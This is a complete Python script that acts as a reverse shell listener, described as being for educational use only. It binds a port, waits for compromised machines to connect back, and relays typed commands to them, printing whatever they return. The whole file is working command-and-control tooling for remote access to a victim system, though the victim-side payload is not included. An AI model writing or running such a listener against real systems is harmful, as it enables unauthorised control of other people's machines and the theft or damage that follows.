#!/usr/bin/env python3
# Simple reverse shell listener (educational use only)
import socket
import subprocess
import sys

def start_listener(host, port):
    """Start a simple reverse shell listener"""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)

    print(f"[*] Listening on {host}:{port}")

    while True:
        client, addr = server.accept()
        print(f"[+] Connection from {addr}")

        while True:
            try:
                cmd = input("shell> ").encode()
                if cmd.decode() == "exit":
                    break
                client.send(cmd)
                output = client.recv(4096).decode()
                print(output)
            except:
                break

        client.close()

if __name__ == "__main__":
    import sys
    if len(sys.argv) != 3:
        print("Usage: python3 listener.py <host> <port>")
        sys.exit(1)

    start_listener(sys.argv[1], int(sys.argv[2]))